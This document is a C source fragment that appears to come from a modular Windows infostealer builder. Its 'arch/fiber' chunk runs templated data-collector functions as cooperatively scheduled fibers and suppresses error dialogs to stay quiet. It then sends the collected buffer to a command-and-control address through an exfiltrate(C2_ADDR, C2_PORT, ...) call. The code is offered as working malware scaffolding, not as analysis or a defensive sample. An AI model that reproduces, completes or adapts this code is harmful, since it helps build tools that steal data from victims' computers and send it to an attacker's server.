// chunk: arch/fiber
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Fiber-based execution — each collector runs as a fiber, scheduled cooperatively

#ifndef CHUNK_ARCH_FIBER
#define CHUNK_ARCH_FIBER

typedef void (*collector_fn)(void);

static LPVOID g_main_fiber = NULL;
static collector_fn g_current_collector = NULL;

static VOID CALLBACK fiber_worker(LPVOID param) {
    (void)param;
    if (g_current_collector)
        g_current_collector();
    SwitchToFiber(g_main_fiber);
}

static void run_as_fiber(collector_fn fn) {
    g_current_collector = fn;
    LPVOID fiber = CreateFiber(0, fiber_worker, NULL);
    if (fiber) {
        SwitchToFiber(fiber);
        DeleteFiber(fiber);
    }
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

    init_buffer();
    if (!g_data) return 1;

    g_main_fiber = ConvertThreadToFiber(NULL);
    if (!g_main_fiber) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    int n = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < n; i++)
        run_as_fiber(collectors[i]);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
